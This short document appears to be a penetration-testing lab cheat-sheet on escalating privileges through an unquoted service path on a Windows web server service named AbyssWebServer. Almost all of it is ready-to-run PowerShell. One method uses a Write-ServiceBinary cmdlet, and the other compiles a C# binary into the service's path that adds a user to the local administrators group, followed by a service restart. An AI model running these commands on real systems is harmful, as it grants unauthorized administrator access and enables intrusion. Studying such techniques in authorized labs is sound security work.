**Unquoted Service Path:**
```powershell
# 1. Stop service
Stop-Service AbyssWebServer

# 2. Add curent user in local admins
Write-ServiceBinary -Name AbyssWebServer -UserName CORP\student -Path "C:\WebServer\Abyss.exe"

# 3. Start service
Start-Service AbyssWebServer

# 4. Check
net localgroup administrators
```

**Or:**
```powershell
# 1. Stop Service
Stop-Service AbyssWebServer

# 2. Change Path and Username !!!
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
class P {
    static void Main() {
        Process.Start("cmd.exe", "/c net localgroup administrators studentX /add");
    }
}
"@ -OutputAssembly C:\WebServer\Abyss.exe -OutputType ConsoleApplication

# 3. Start service
Start-Service AbyssWebServer
```
